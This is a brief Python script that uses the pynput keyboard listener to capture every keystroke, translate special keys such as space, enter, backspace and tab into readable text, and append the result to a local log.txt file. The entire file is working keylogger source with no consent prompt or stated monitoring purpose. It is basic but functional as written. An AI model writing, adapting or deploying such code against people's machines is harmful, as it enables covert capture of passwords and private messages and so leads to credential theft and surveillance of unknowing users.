from pynput.keyboard import Listener


def write_to_File(key):
    # Convert the key into a string and clean up formatting
    latter = str(key).replace("'", "")

    # Handle individual special keys
    if latter == 'Key.space':
        latter = ' '  # Space key
    elif latter == 'Key.shift' or latter == 'Key.shift_r':
        latter = ''  # Ignore shift keys for logging
    elif latter == 'Key.enter':
        latter = '\n'  # Enter creates a new line
    elif latter == 'Key.backspace':
        latter = '[BACKSPACE]'  # Backspace is logged as '[BACKSPACE]'
    elif latter == 'Key.tab':
        latter = '[TAB]'  # Tab key is logged as '[TAB]'
    elif latter in ['Key.alt', 'Key.alt_r']:
        latter = '[ALT]'  # Alt keys
    elif latter == 'Key.esc':
        latter = '[ESC]'  # Escape key

    # Write to the log file (append mode)
    with open("log.txt", 'a') as f:
        f.write(latter)


# Set up the listener for capturing keystrokes
with Listener(on_press=write_to_File) as ls:
    ls.join()
